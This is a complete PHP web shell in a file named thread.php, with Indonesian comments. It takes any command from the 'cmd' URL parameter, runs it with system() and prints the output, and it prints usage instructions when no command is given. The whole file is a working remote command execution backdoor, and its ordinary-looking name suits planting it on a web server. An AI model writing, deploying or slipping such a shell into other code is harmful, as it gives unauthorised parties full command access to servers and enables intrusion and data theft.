<?php
// thread.php

// Cek apakah parameter 'cmd' ada
if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];

    // Jalankan perintah shell (DANGEROUS: gunakan dengan hati-hati!)
    echo "<pre>";
    echo "Menjalankan perintah: " . htmlspecialchars($cmd) . "\n\n";
    system($cmd); // atau gunakan shell_exec($cmd);
    echo "</pre>";
} else {
    echo "Gunakan parameter ?cmd=perintah";
}
?>
